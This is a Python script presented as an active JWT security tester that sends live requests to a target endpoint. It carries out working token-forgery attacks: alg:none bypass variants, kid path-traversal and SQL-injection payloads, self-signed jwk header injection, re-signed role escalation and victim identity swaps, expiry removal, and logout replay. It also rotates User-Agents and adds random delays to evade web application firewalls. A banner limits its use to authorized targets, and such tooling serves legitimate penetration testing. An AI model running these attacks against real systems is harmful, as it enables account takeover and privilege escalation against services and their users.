import sys
import json
import base64
import hmac
import hashlib
import argparse
import time
import random
import urllib.parse

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Colors
R   = "\033[91m"
Y   = "\033[93m"
G   = "\033[92m"
C   = "\033[96m"
W   = "\033[97m"
DIM = "\033[2m"
B   = "\033[1m"
RST = "\033[0m"


# ── User-Agent pool for WAF evasion ─────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]


def random_delay(min_s=1.0, max_s=3.0):
    time.sleep(random.uniform(min_s, max_s))


def random_headers():
    return {"User-Agent": random.choice(USER_AGENTS)}


# ── Base64url helpers 
def b64u_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64u_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def encode_json(obj: dict) -> str:
    return b64u_encode(json.dumps(obj, separators=(",", ":")).encode())


def parse_jwt(token: str):
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("Invalid JWT format — expected header.payload.signature")
    try:
        header  = json.loads(b64u_decode(parts[0]))
        payload = json.loads(b64u_decode(parts[1]))
    except Exception as e:
        raise ValueError(f"Failed to decode JWT: {e}")
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def sign_hs(header: dict, payload: dict, secret: str, alg="HS256") -> str:
    h = dict(header)
    h["alg"] = alg
    msg = f"{encode_json(h)}.{encode_json(payload)}".encode()
    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_fn = hash_map.get(alg, hashlib.sha256)
    sigval = hmac.new(secret.encode(), msg, hash_fn).digest()
    return f"{msg.decode()}.{b64u_encode(sigval)}"


def generate_rsa_keypair():
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    priv_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()

    pub_numbers = key.public_key().public_numbers()
    n_bytes = pub_numbers.n.to_bytes((pub_numbers.n.bit_length() + 7) // 8, "big")
    e_bytes = pub_numbers.e.to_bytes((pub_numbers.e.bit_length() + 7) // 8, "big")

    jwk = {
        "kty": "RSA", "n": b64u_encode(n_bytes), "e": b64u_encode(e_bytes),
        "use": "sig", "alg": "RS256", "kid": "lifecycle-tester-key-1",
    }
    return key, priv_pem, jwk


def sign_rs_with_private_key(header: dict, payload: dict, private_key_pem: str, alg="RS256") -> str:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding

    h = dict(header)
    h["alg"] = alg
    msg = f"{encode_json(h)}.{encode_json(payload)}".encode()
    key = serialization.load_pem_private_key(private_key_pem.encode(), password=None)
    hash_map = {"RS256": hashes.SHA256(), "RS384": hashes.SHA384(), "RS512": hashes.SHA512()}
    sigval = key.sign(msg, padding.PKCS1v15(), hash_map.get(alg, hashes.SHA256()))
    return f"{msg.decode()}.{b64u_encode(sigval)}"


# ── HTTP request wrapper 
def send_request(url, token, method="GET", token_location="bearer", timeout=10):
    """
    token_location: 'bearer' (Authorization header) or 'cookie:NAME'
    Returns (status_code, body_text, elapsed_seconds, final_url)
    or (None, None, None, None) on error.

    Redirects ARE followed so we see the actual final response —
    e.g. a rejected JWT that redirects to /login gives HTTP 200
    (login page) with allow_redirects=False giving HTTP 302, but
    either way we capture the final URL to detect redirect-to-login.
    """
    headers = random_headers()
    cookies = {}

    if token_location.startswith("cookie:"):
        cookie_name = token_location.split(":", 1)[1]
        cookies[cookie_name] = token
    else:
        headers["Authorization"] = f"Bearer {token}"

    try:
        resp = requests.request(
            method, url, headers=headers, cookies=cookies,
            verify=False, timeout=timeout, allow_redirects=True,
        )
        return resp.status_code, resp.text, resp.elapsed.total_seconds(), resp.url
    except requests.exceptions.RequestException as e:
        return None, f"REQUEST_ERROR: {e}", None, None


# ── Response comparator ───────────────────────────────────────
# Keywords that indicate a login/auth page — used to detect redirect-to-login
_LOGIN_SIGNALS = (
    "login", "sign in", "signin", "log in", "password",
    "username", "email", "forgot password", "create account",
    "please log in", "please sign in", "authentication required",
)

def _looks_like_login_page(body: str) -> bool:
    """Heuristic: does this response body look like a login/redirect page?"""
    b = body.lower()
    hits = sum(1 for s in _LOGIN_SIGNALS if s in b)
    return hits >= 2   # at least 2 signals = likely a login page


def responses_meaningfully_differ(baseline_status, baseline_body,
                                   test_status, test_body,
                                   baseline_url=None, test_url=None):
    """
    Decide if test response indicates a *different* outcome than baseline.
    Returns (differs: bool, reason: str).

    Key fix: if the test response looks like a login/redirect page but the
    baseline does NOT, that means the token was REJECTED (redirected to
    login) even if both return HTTP 200. We treat this as 'differs=True'
    (not vulnerable) — the caller logic needs differs=False to flag VULNERABLE.
    """

    # ── URL-based redirect detection 
    # If the final URL changed to something containing 'login', 'signin',
    # 'auth' — the server redirected us away, meaning the token was rejected.
    if test_url and baseline_url:
        test_path  = urllib.parse.urlparse(test_url).path.lower()
        base_path  = urllib.parse.urlparse(baseline_url).path.lower()
        login_paths = ("login", "signin", "sign-in", "auth", "session/new")
        redirected_to_login = any(p in test_path for p in login_paths)
        was_on_login        = any(p in base_path  for p in login_paths)
        if redirected_to_login and not was_on_login:
            return True, f"redirected to login page ({test_url}) — token rejected"

    # ── Status code change 
    if test_status != baseline_status:
        return True, f"status changed {baseline_status} -> {test_status}"

    # ── Login-page body detection (the core false-positive fix) ──
    # Both return 200 but test body is a login page while baseline is not?
    # → Server rejected the token (302→login→200) even though status matches.
    if _looks_like_login_page(test_body) and not _looks_like_login_page(baseline_body):
        return True, "response is a login page — token was rejected (redirect-to-login)"

    # ── Body length difference 
    # Keep threshold small (15 bytes / 5%) to catch admin-data additions
    # but only after the login-page check above has passed.
    threshold = max(15, len(baseline_body) * 0.05)
    len_diff  = abs(len(test_body) - len(baseline_body))
    if len_diff > threshold:
        return True, f"body length differs ({len(baseline_body)} -> {len(test_body)} bytes)"

    return False, "response looks identical to baseline"


# ── Verdict printing 
def print_test_header(name):
    print(f"\n  {C}{B}{'─'*64}{RST}")
    print(f"  {C}{B}{name}{RST}")
    print(f"  {C}{'─'*64}{RST}")


def print_verdict(verdict, detail):
    colors = {"VULNERABLE": R, "SAFE": G, "INCONCLUSIVE": Y, "SKIPPED": DIM, "ERROR": R}
    color = colors.get(verdict, W)
    print(f"    {color}{B}[{verdict}]{RST} {detail}")


# TEST 1: Baseline
def test_baseline(url, token, token_location):
    print_test_header("BASELINE — confirming original token works")
    status, body, elapsed, final_url = send_request(url, token, token_location=token_location)
    if status is None:
        print_verdict("ERROR", f"Request failed: {body}")
        return None, None, None

    print(f"    {DIM}Status: {status}, Body length: {len(body)} bytes{RST}")
    if 200 <= status < 300:
        print_verdict("OK", "Baseline returns 2xx — proceeding with active tests")
    else:
        print_verdict("WARNING", f"Baseline status is {status}, not 2xx. Results below may be unreliable.")
    return status, body, final_url


# TEST 2: alg:none — multi-variant
def test_alg_none(url, header, payload, baseline_status, baseline_body, token_location, baseline_url=None):
    print_test_header("ALG:NONE — signature verification bypass")

    variants = []
    for alg in ["none", "None", "NONE", "nOnE"]:
        h = dict(header)
        h["alg"] = alg
        variants.append((f'alg="{alg}" (trailing dot)', f"{encode_json(h)}.{encode_json(payload)}."))
        variants.append((f'alg="{alg}" (no trailing dot)', f"{encode_json(h)}.{encode_json(payload)}"))

    for label, tok in variants:
        status, body, _, final_url = send_request(url, tok, token_location=token_location)
        random_delay()
        if status is None:
            continue
        differs, reason = responses_meaningfully_differ(baseline_status, baseline_body, status, body, baseline_url=baseline_url, test_url=final_url)
        if 200 <= status < 300:
            print_verdict("VULNERABLE", f"{label} -> HTTP {status} (server accepted unsigned token!)")
            return "VULNERABLE", label
        else:
            print(f"    {DIM}{label} -> HTTP {status} (rejected){RST}")

    print_verdict("SAFE", "All alg:none variants rejected")
    return "SAFE", None


# TEST 3: kid injection — multi-variant, multi-encoding
def test_kid_injection(url, header, payload, baseline_status, baseline_body, token_location, baseline_url=None):
    if "kid" not in header:
        print_test_header("KID INJECTION")
        print_verdict("SKIPPED", "Token has no 'kid' header — not applicable")
        return "SKIPPED", None

    print_test_header("KID INJECTION — /dev/null path traversal (multi-variant)")

    # Different depths, encodings, and separators — one miss doesn't mean safe
    null_paths = [
        "../../../../../../dev/null",
        "../../../../../../../dev/null",
        "../../../../../../../../dev/null",
        "/dev/null",
        "....//....//....//....//....//....//dev/null",          # double-dot bypass
        "..%2f..%2f..%2f..%2f..%2f..%2fdev%2fnull",                # URL-encoded
        "..\\..\\..\\..\\..\\..\\dev\\null",                       # backslash variant
        "file:///dev/null",
        "/proc/self/environ",  # different empty/predictable file
    ]

    for kid_path in null_paths:
        h = dict(header)
        h["kid"] = kid_path
        h["alg"] = "HS256"
        # /dev/null and /proc/self/environ-as-empty both imply empty-byte secret
        tok = sign_hs(h, payload, "", alg="HS256")
        status, body, _, final_url = send_request(url, tok, token_location=token_location)
        random_delay()
        if status is None:
            continue
        if 200 <= status < 300:
            differs, reason = responses_meaningfully_differ(baseline_status, baseline_body, status, body, baseline_url=baseline_url, test_url=final_url)
            if differs and "status changed" not in reason:
                # same 2xx but body differs significantly — likely real account data
                print_verdict("VULNERABLE", f'kid="{kid_path}" -> HTTP {status}, {reason}')
                return "VULNERABLE", kid_path
            elif status == baseline_status:
                print_verdict("VULNERABLE", f'kid="{kid_path}" -> HTTP {status} (same as authenticated baseline — empty-secret signature accepted!)')
                return "VULNERABLE", kid_path
            else:
                print(f"    {DIM}kid=\"{kid_path}\" -> HTTP {status} (2xx but differs from baseline, inconclusive){RST}")
        else:
            print(f"    {DIM}kid=\"{kid_path}\" -> HTTP {status} (rejected){RST}")

    # SQLi variant — forces secret="1"
    h = dict(header)
    h["kid"] = "x' UNION SELECT '1';--"
    h["alg"] = "HS256"
    tok = sign_hs(h, payload, "1", alg="HS256")
    status, body, _, final_url = send_request(url, tok, token_location=token_location)
    random_delay()
    if status is not None and 200 <= status < 300:
        print_verdict("VULNERABLE", f'kid SQLi variant -> HTTP {status} (secret="1" via UNION SELECT accepted!)')
        return "VULNERABLE", "sqli_kid"
    elif status is not None:
        print(f"    {DIM}kid SQLi variant -> HTTP {status} (rejected){RST}")

    print_verdict("SAFE", "All kid injection variants rejected")
    return "SAFE", None


# TEST 4: jwk_embed
def test_jwk_embed(url, header, payload, baseline_status, baseline_body, token_location, baseline_url=None):
    print_test_header("JWK HEADER EMBED — self-signed key injection")

    if not (200 <= baseline_status < 300):
        print_verdict("SKIPPED", f"Baseline is HTTP {baseline_status} (not 2xx) — cannot compare reliably")
        return "SKIPPED", None

    key, priv_pem, jwk = generate_rsa_keypair()
    h = dict(header)
    h["alg"] = "RS256"
    h["jwk"] = jwk
    h.pop("kid", None)

    tok = sign_rs_with_private_key(h, payload, priv_pem, alg="RS256")
    status, body, _, final_url = send_request(url, tok, token_location=token_location)
    random_delay()

    if status is None:
        print_verdict("ERROR", "Request failed")
        return "ERROR", None

    if 200 <= status < 300:
        differs, reason = responses_meaningfully_differ(baseline_status, baseline_body, status, body, baseline_url=baseline_url, test_url=final_url)
        if not differs:
            print_verdict("VULNERABLE", f"HTTP {status} — server verified signature using attacker-embedded jwk!")
            return "VULNERABLE", tok
        else:
            print_verdict("INCONCLUSIVE", f"HTTP {status} but {reason} — possibly accepted but different content")
            return "INCONCLUSIVE", None

    print(f"    {DIM}jwk_embed -> HTTP {status} (rejected){RST}")
    print_verdict("SAFE", "jwk header embed rejected")
    return "SAFE", None


# TEST 5: Role/identity tampering (requires known secret)
def test_role_tamper(url, header, payload, secret, victim, admin_val,
                      baseline_status, baseline_body, token_location, baseline_url=None):
    print_test_header("ROLE/IDENTITY TAMPERING — privilege escalation")

    if not secret:
        print_verdict("SKIPPED", "No --secret provided — cannot re-sign tampered payload")
        return "SKIPPED", None

    role_fields = ["role", "roles", "group", "groups", "type", "userType",
                    "isAdmin", "admin", "privilege", "scope", "permission"]
    sub_fields  = ["sub", "email", "user", "userId", "user_id", "username", "id"]

    found_any = False
    for field in role_fields:
        if field in payload:
            found_any = True
            for newval, label in [(admin_val, admin_val), (True, "true")]:
                p = dict(payload)
                p[field] = newval
                alg = header.get("alg", "HS256")
                tok = sign_hs(header, p, secret, alg=alg)
                status, body, _, final_url = send_request(url, tok, token_location=token_location)
                random_delay()
                if status is None:
                    continue
                if status != baseline_status:
                    print_verdict("INCONCLUSIVE",
                                   f'{field}="{label}" -> HTTP {status} (status changed from baseline {baseline_status} — secret may be wrong, or escalation triggered a different page)')
                else:
                    differs, reason = responses_meaningfully_differ(baseline_status, baseline_body, status, body, baseline_url=baseline_url, test_url=final_url)
                    if differs:
                        print_verdict("VULNERABLE",
                                       f'{field}="{label}" -> HTTP {status}, {reason} (privilege change accepted!)')
                        return "VULNERABLE", f"{field}={label}"
                    else:
                        print(f"    {DIM}{field}=\"{label}\" -> HTTP {status} (no observable change){RST}")

    for field in sub_fields:
        if field in payload:
            found_any = True
            p = dict(payload)
            p[field] = victim
            alg = header.get("alg", "HS256")
            tok = sign_hs(header, p, secret, alg=alg)
            status, body, _, final_url = send_request(url, tok, token_location=token_location)
            random_delay()
            if status is None:
                continue
            if status == baseline_status:
                differs, reason = responses_meaningfully_differ(baseline_status, baseline_body, status, body, baseline_url=baseline_url, test_url=final_url)
                if differs:
                    print_verdict("VULNERABLE", f'{field}="{victim}" -> HTTP {status}, {reason} (identity swap accepted!)')
                    return "VULNERABLE", f"{field}={victim}"
                else:
                    print(f"    {DIM}{field}=\"{victim}\" -> HTTP {status} (no observable change){RST}")
            else:
                print_verdict("INCONCLUSIVE", f'{field}="{victim}" -> HTTP {status} (status changed — check secret correctness)')

    if not found_any:
        print_verdict("SKIPPED", "No recognizable role/identity fields in payload")
        return "SKIPPED", None

    print_verdict("SAFE", "No privilege escalation observed via re-signed tampered tokens")
    return "SAFE", None


# TEST 6: exp / nbf manipulation (requires known secret to stay valid)
def test_expiry(url, header, payload, secret, baseline_status, baseline_body, token_location, baseline_url=None):
    print_test_header("EXPIRY MANIPULATION")

    if "exp" not in payload:
        print_verdict("SKIPPED", "Token has no 'exp' claim")
        return "SKIPPED", None

    if not secret:
        print_verdict("SKIPPED", "No --secret provided — cannot re-sign with modified exp")
        return "SKIPPED", None

    if not (200 <= baseline_status < 300):
        print_verdict("SKIPPED", f"Baseline is HTTP {baseline_status} (not 2xx) — cannot compare reliably")
        return "SKIPPED", None

    alg = header.get("alg", "HS256")

    # exp removed entirely
    p = dict(payload)
    del p["exp"]
    tok = sign_hs(header, p, secret, alg=alg)
    status, body, _, final_url = send_request(url, tok, token_location=token_location)
    random_delay()
    if status is not None and 200 <= status < 300:
        differs, reason = responses_meaningfully_differ(
            baseline_status, baseline_body, status, body,
            baseline_url=baseline_url, test_url=final_url)
        if not differs:
            print_verdict("VULNERABLE", "Token with 'exp' removed entirely was accepted — token may never expire")
            return "VULNERABLE", "exp_removed"
        else:
            print(f"    {DIM}exp removed -> HTTP {status} but {reason}{RST}")
    else:
        print(f"    {DIM}exp removed -> HTTP {status or 'None'} (rejected/changed){RST}")

    print_verdict("SAFE", "exp removal did not bypass expiry checks")
    return "SAFE", None


# TEST 7: Logout / session invalidation replay
def test_logout_replay(url, token, logout_url, token_location,
                        baseline_status, baseline_body, baseline_url=None):
    print_test_header("LOGOUT REPLAY — session invalidation check")

    if not logout_url:
        print_verdict("SKIPPED", "No --logout-url provided")
        return "SKIPPED", None

    print(f"    {DIM}Sending POST to logout URL...{RST}")
    headers = random_headers()
    cookies = {}
    if token_location.startswith("cookie:"):
        cookie_name = token_location.split(":", 1)[1]
        cookies[cookie_name] = token
    else:
        headers["Authorization"] = f"Bearer {token}"

    try:
        logout_resp = requests.post(logout_url, headers=headers, cookies=cookies,
                                      verify=False, timeout=10, allow_redirects=False)
        print(f"    {DIM}Logout response: HTTP {logout_resp.status_code}{RST}")
    except requests.exceptions.RequestException as e:
        print_verdict("ERROR", f"Logout request failed: {e}")
        return "ERROR", None

    random_delay(2, 4)  # give server time to invalidate session

    print(f"    {DIM}Replaying original token against protected URL...{RST}")
    status, body, _, final_url = send_request(url, token, token_location=token_location)

    if status is None:
        print_verdict("ERROR", "Replay request failed")
        return "ERROR", None

    if 200 <= status < 300:
        differs, reason = responses_meaningfully_differ(baseline_status, baseline_body, status, body, baseline_url=baseline_url, test_url=final_url)
        if not differs:
            print_verdict("VULNERABLE",
                           f"Old token still returns HTTP {status} after logout — session not invalidated server-side!")
            return "VULNERABLE", None
        else:
            print_verdict("INCONCLUSIVE", f"HTTP {status} after logout but response differs from baseline ({reason})")
            return "INCONCLUSIVE", None
    else:
        print_verdict("SAFE", f"Old token rejected after logout (HTTP {status})")
        return "SAFE", None


# MAIN
def banner():
    print(f"""{C}{B}
  ╦╦ ╦╔╦╗  ╦  ╦╔═╗╔═╗╔═╗╦ ╦╔═╗╦  ╔═╗  ╔╦╗╔═╗╔═╗╔╦╗╔═╗╦═╗
  ║║║║ ║   ║  ║╠╣ ║╣ ║  ╚╦╝║   ║  ║╣    ║ ║╣ ╚═╗ ║ ║╣ ╠╦╝
  ╚╩╩╝ ╩   ╩═╝╩╚  ╚═╝╚═╝ ╩ ╚═╝╚═╝╚═╝   ╩ ╚═╝╚═╝ ╩ ╚═╝╩╚═
{RST}{DIM}  Active JWT tester — sends real requests, diffs responses{RST}
{Y}{B}  WARNING: This sends live HTTP requests. Only use on targets{RST}
{Y}{B}  you are authorized to test.{RST}
""")


def main():
    parser = argparse.ArgumentParser(
        description="JWT Lifecycle Tester — active vulnerability tester with verdicts",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("--token", required=True, help="The JWT to test")
    parser.add_argument("--url", required=True, help="Protected endpoint URL to test against")
    parser.add_argument("--logout-url", help="Logout endpoint URL (for session invalidation test)")
    parser.add_argument("--secret", help="Known/guessed HMAC secret (enables re-signing tests)")
    parser.add_argument("--victim", default="victim@target.com", help="Victim identity to inject")
    parser.add_argument("--admin", default="administrator", help="Admin role value to inject")
    parser.add_argument("--token-location", default="bearer",
                        help='Where to place the token: "bearer" (Authorization header, default) '
                             'or "cookie:NAME" (e.g. "cookie:session")')
    parser.add_argument("--skip", nargs="*", default=[],
                        choices=["alg_none", "kid", "jwk_embed", "role", "expiry", "logout"],
                        help="Skip specific tests")

    args = parser.parse_args()

    try:
        header, payload, sig = parse_jwt(args.token)
    except ValueError as e:
        print(f"{R}Error: {e}{RST}")
        sys.exit(1)

    banner()
    print(f"  {DIM}Target URL:{RST}  {W}{args.url}{RST}")
    print(f"  {DIM}Header :{RST}     {W}{json.dumps(header)}{RST}")
    print(f"  {DIM}Payload:{RST}     {W}{json.dumps(payload)}{RST}")

    results = {}

    baseline_status, baseline_body, baseline_url = test_baseline(args.url, args.token, args.token_location)
    if baseline_status is None:
        print(f"\n{R}Cannot proceed without a working baseline. Exiting.{RST}")
        sys.exit(1)

    if "alg_none" not in args.skip:
        results["alg_none"] = test_alg_none(args.url, header, payload, baseline_status, baseline_body, args.token_location, baseline_url)

    if "kid" not in args.skip:
        results["kid"] = test_kid_injection(args.url, header, payload, baseline_status, baseline_body, args.token_location, baseline_url)

    if "jwk_embed" not in args.skip:
        results["jwk_embed"] = test_jwk_embed(args.url, header, payload, baseline_status, baseline_body, args.token_location, baseline_url)

    if "role" not in args.skip:
        results["role"] = test_role_tamper(args.url, header, payload, args.secret, args.victim, args.admin,
                                             baseline_status, baseline_body, args.token_location, baseline_url)

    if "expiry" not in args.skip:
        results["expiry"] = test_expiry(args.url, header, payload, args.secret, baseline_status, baseline_body, args.token_location, baseline_url)

    if "logout" not in args.skip:
        results["logout"] = test_logout_replay(args.url, args.token, args.logout_url, args.token_location,
                                                  baseline_status, baseline_body, baseline_url)

    # ── Summary 
    print(f"\n  {C}{B}{'='*64}{RST}")
    print(f"  {W}{B}SUMMARY{RST}")
    print(f"  {C}{'='*64}{RST}")
    for test_name, (verdict, detail) in results.items():
        colors = {"VULNERABLE": R, "SAFE": G, "INCONCLUSIVE": Y, "SKIPPED": DIM, "ERROR": R}
        color = colors.get(verdict, W)
        print(f"    {test_name:<12} {color}{B}[{verdict}]{RST}" + (f"  {DIM}{detail}{RST}" if detail else ""))

    vulnerable = [k for k, (v, _) in results.items() if v == "VULNERABLE"]
    if vulnerable:
        print(f"\n  {R}{B}⚠ {len(vulnerable)} potential issue(s) found: {', '.join(vulnerable)}{RST}")
        print(f"  {DIM}Manually verify each before reporting — confirm impact and reproduce in Burp.{RST}")
    else:
        print(f"\n  {G}No issues found in this pass. Consider testing other endpoints/tokens.{RST}")


if __name__ == "__main__":
    main()